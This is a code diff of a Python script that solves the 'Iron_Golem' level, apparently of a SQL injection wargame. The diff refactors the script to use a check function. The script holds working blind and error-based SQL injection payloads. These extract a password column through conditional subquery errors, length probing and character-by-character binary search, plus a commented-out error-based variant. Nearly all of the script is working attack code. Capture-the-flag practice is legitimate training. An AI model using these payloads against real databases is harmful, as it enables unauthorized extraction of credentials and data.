@@ -4,6 +4,10 @@ import los
 from getpass import getpass
 
 
+def check_func(response: str) -> bool:
+    return 'select id from prob_iron_golem' in response
+
+
 def main():
     '''
     Iron_Golem
@@ -35,21 +39,26 @@ def main():
         exit(1)
 
     payload = "'||if(length(pw)>%s,1,(select 1 union select 2))#"
-    len_of_key = los.find_key_len(
-        url, payload, 'pw', 'select id from prob_iron_golem', cook)
+    param = dict(pw=payload)
+    len_of_key = los.find_key_len(url, param, check_func, cook)
 
     print(len_of_key)
 
     payload = "'||if(ord(mid(pw,%s,1))%s,1,(select 1 union select 2))#"
-    result = los.find_binary(url, payload,
-                             'pw', 'select id from prob_iron_golem', 32, 127, len_of_key, cook)
+    param = dict(pw=payload)
+    result = los.find_binary(
+        url, param, check_func, 32, 127, len_of_key, cook)
 
-    # Altersative with bit function 256 requests (218)
+    # Alternative with bit function 256 requests, 218 in binary search
     '''
     payload = "'||if(mid(lpad(bin(ord(mid(pw,%s,1))),%s,0),%s,1),1,(select 1 union select 2))#"
     param = dict(pw=payload)
     result = los.find_pass_over_bits(
-        url, param, len_of_key, 'select id from prob_iron_golem', cook)
+        url, param, len_of_key, check_func, cook)
+    '''
+    # Error-Based SQL injection
+    ''' 
+    payload = "'||(select concat(floor(rand(33)*2),pw)x from (select 1 union select 2)t group by x having min(0))#"
     '''
 
     param = dict(pw=result)
